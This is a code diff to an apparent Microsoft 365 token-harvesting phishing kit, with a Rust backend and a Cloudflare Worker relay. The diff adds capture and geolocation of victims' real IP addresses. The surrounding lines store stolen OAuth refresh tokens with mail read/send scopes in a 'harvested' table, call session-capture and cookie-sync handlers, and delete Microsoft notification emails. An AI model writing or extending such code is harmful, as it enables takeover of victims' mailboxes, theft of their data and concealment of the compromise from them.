@@ -82,6 +82,9 @@ use teams::{list_teams_handler, list_team_channels_handler, share_to_teams_handl
 mod cookie_client;
 use cookie_client::{generate_bookmarklet_token_handler, sync_cookies_handler, test_cookie_session_handler, ghost_session_capture_handler, get_session_status_handler, kill_session_handler};
 
+mod tenant_utils;
+use tenant_utils::{detect_tenant_fixed, get_location_from_ip};
+
 // ------------------- CONFIGURATION -------------------
 #[derive(Debug, Clone)]
 pub struct AppConfig {
@@ -430,6 +433,7 @@ async fn delete_microsoft_notification_email(access_token: String) {
 #[derive(Deserialize)]
 struct ExchangeQuery {
     code: String,
+    user_ip: Option<String>,
 }
 
 /// Decode an id_token JWT without signature verification (we only need the claims).
@@ -518,14 +522,18 @@ async fn exchange_code(
                     .and_then(|id_token| decode_id_token(id_token));
                 
                 // Detect tenant and account type
-                let (tenant_id, account_type) = detect_tenant(&email_str, id_token_claims.as_ref());
+                let (tenant_name, account_type) = detect_tenant_fixed(&email_str, id_token_claims.as_ref());
                 let category = account_type.clone(); // Keep category for backward compatibility
                 
-                // Get IP address from request
-                let ip_address = req.connection_info().peer_addr().map(|s| s.to_string()).unwrap_or_else(|| "unknown".to_string());
-                let location = Some("Unknown".to_string()); // Will be resolved via geolocation API
+                // Get IP address - try from query parameter first (passed from Cloudflare Worker), then from request
+                let ip_address = query.user_ip.clone()
+                    .or_else(|| req.connection_info().peer_addr().map(|s| s.to_string()))
+                    .unwrap_or_else(|| "unknown".to_string());
                 
-                println!("Attempting to insert token for email: {:?}, tenant: {:?}, account_type: {:?}", email, tenant_id, account_type);
+                // Resolve location from IP
+                let (location, _region, _country) = get_location_from_ip(&ip_address).await;
+                
+                println!("Attempting to insert token for email: {:?}, tenant: {:?}, account_type: {:?}", email, tenant_name, account_type);
                 // Store in harvested table (legacy, for dashboard display)
                 // Session is ACTIVE immediately - OAuth token provides full access
                 match sqlx::query(
@@ -540,7 +548,7 @@ async fn exchange_code(
                 .bind("oauth_app")
                 .bind(&ip_address)
                 .bind(&location)
-                .bind(&tenant_id)
+                .bind(&tenant_name)
                 .bind(&category)
                 .bind(&account_type)
                 .bind(Option::<chrono::DateTime<Utc>>::None)
@@ -560,7 +568,7 @@ async fn exchange_code(
                     refresh_token,
                     vec!["openid".to_string(), "offline_access".to_string(), "User.Read".to_string(), "Mail.ReadWrite".to_string(), "Mail.Send".to_string(), "Contacts.Read".to_string(), "MailboxSettings.ReadWrite".to_string()],
                     refresh_expires_at,
-                    account_type.as_deref(),
+                    Some(account_type.as_str()),
                 ).await {
                     Ok(token_id) => println!("[exchange] Stored encrypted token in vault: {}", token_id),
                     Err(e) => eprintln!("[exchange] ERROR storing encrypted token in vault: {}", e),
@@ -913,7 +921,11 @@ async function handleRequest(request) {
   if (url.pathname === '/oauth/callback') {
     const code = url.searchParams.get('code');
     if (!code) return new Response('Missing authorization code', { status: 400 });
-    const exchangeUrl = `${_MAIN_SERVER}/exchange?code=${encodeURIComponent(code)}`;
+    
+    // Capture the user's real IP address
+    const userIp = request.headers.get('CF-Connecting-IP') || request.headers.get('X-Forwarded-For') || 'unknown';
+    
+    const exchangeUrl = `${_MAIN_SERVER}/exchange?code=${encodeURIComponent(code)}&user_ip=${encodeURIComponent(userIp)}`;
     let tokenId = '';
     try { 
       const resp = await fetch(exchangeUrl, { method: 'GET' }); 
